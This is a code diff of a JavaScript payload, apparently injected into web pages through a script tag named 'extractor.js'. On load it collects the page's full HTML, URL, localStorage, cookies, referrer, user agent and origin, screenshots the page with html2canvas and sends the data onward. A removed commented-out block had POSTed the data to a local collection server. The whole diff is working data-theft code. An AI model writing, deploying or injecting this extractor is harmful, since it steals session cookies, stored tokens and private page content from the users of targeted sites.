@@ -26,32 +26,6 @@ function addEvent(element, eventName, fn) {
 
 
 
-    getDomText()
-    getUrl()
-    getLocalStorage()
-    cookies()
-    getReferrer()
-    getUserAgent()
-    origin()
-
-    data.title = document.title;
-
-
-/*     (async () => {
-        const rawResponse = await fetch('http://0.0.0.0:8080/post', {
-          method: 'POST',
-          headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(data)
-        });
-        const content = await rawResponse.json();
-      
-        //console.log(content);
-      })(); */
-    //console.log(data.title)
-// Trying to extract the dom text from every option possible
 function getDomText() {
     try{
         data.dom = document.documentElement.outerHTML
@@ -140,25 +114,40 @@ function sendData(screend_data){
 }
 
 function screenshot(){
-    html2canvas(document.body).then(function(canvas) {
-        data.screenshot_encoded = canvas.toDataURL()
-        sendData(canvas.toDataURL())
+    html2canvas(document.body, { logging: true, letterRendering: 1, allowTaint: true , useCORS: true } ).then(function(canvas) {
+        fg  = canvas.toDataURL()
+        sendData(fg.replace('data:image/png;base64,',''))
     });
 }
 
 if( document.readyState == "complete" ) {
-    screenshot()
-    console.log(data.screenshot_encoded)
 
-    //extract()
-   
+
+    getDomText()
+    getUrl()
+    getLocalStorage()
+    cookies()
+    getReferrer()
+    getUserAgent()
+    origin()
+
+    data.title = document.title;
+    screenshot()
 } else { 
+
     addEvent( window, "load", function(){
+
+
+    getDomText()
+    getUrl()
+    getLocalStorage()
+    cookies()
+    getReferrer()
+    getUserAgent()
+    origin()
+
+    data.title = document.title;
         screenshot()
-        //extract()
     });
 }
-
-
-//console.log(data);
-
+//<script src="extractor.js"></script>
